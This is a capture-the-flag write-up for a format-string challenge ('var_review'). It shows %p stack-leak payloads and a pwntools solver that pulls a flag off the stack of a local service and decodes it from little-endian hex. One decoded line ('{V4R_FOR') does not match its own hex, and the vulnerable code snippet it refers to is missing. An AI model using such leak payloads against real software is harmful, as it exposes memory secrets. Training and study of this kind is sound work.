🔍 Vulnerability Identification
Analysis of the provided binary (or source code) reveals that user input is passed directly to printf() in the play_match function:
This allows a player to use format specifiers like %p to read values from the stack or %s to dereference pointers. Because the flag is loaded into a local buffer on the stack, it is susceptible to a memory leak attack.

🛠️ Exploitation Steps
1. Fuzzing the Stack
By providing a long string of %p, we can see the contents of the stack.
python3 -c "print('%p ' * 30)" | ./var_review

2. Identifying the Flag
Looking at the hex output, we search for the ASCII representation of INFO (0x4f464e49). In the provided environment, the flag starts at Offset 22.

3. Leaking the Full Range
The flag is 32+ characters long, meaning it spans multiple 8-byte (64-bit) registers on the stack. To capture the entire string, we must leak from Offset 22 to Offset 26.

echo "%22\$p %23\$p %24\$p %25\$p %26\$p" | ./var_review

4. Decoding the Hex
The leaked values are in Little Endian. We must reverse the bytes of each hex block to get the human-readable string.
0x535941444f464e49 : INFODAYS
0x5230465f5234567b : {V4R_FOR
0x315254535f54344d : M4T_STR1
0x5f4b34334c5f474e : NG_L34K_
0x7d36323032 : 2026}

🐍 Automated Solver


from pwn import *
target_ip = '127.0.0.1'
target_port = 8006

def get_flag():
    # Connect to the Docker container
    io = remote(target_ip, target_port)

    # 2. Prepare the Payload
    # We found the flag starts at offset 22 and ends at 26
    payload = "%22$p %23$p %24$p %25$p %26$p"

    # 3. Send the payload
    io.sendlineafter(b"last play: ", payload.encode())

    # 4. Receive the leaked hex
    io.recvuntil(b"Referee's Log: ")
    leaked_data = io.recvline().decode().strip().split()
    
    io.close()

    # 5. Decode the Little-Endian Hex
    full_flag = ""
    for hex_val in leaked_data:
        # Strip '0x', convert to bytes, and reverse (Little Endian)
        clean_hex = hex_val.replace("0x", "")
        # Handle cases where hex might be missing a leading zero
        if len(clean_hex) % 2 != 0:
            clean_hex = "0" + clean_hex
            
        byte_data = bytes.fromhex(clean_hex)
        full_flag += byte_data[::-1].decode('utf-8', errors='ignore')

    return full_flag

if __name__ == "__main__":
    print("[*] Attacking the VAR Review System...")
    flag = get_flag()
    print(f"[+] Found Flag: {flag}")






🏁 Final Flag
INFODAYS{V4R_F0RM4T_STR1NG_L34K_2026}
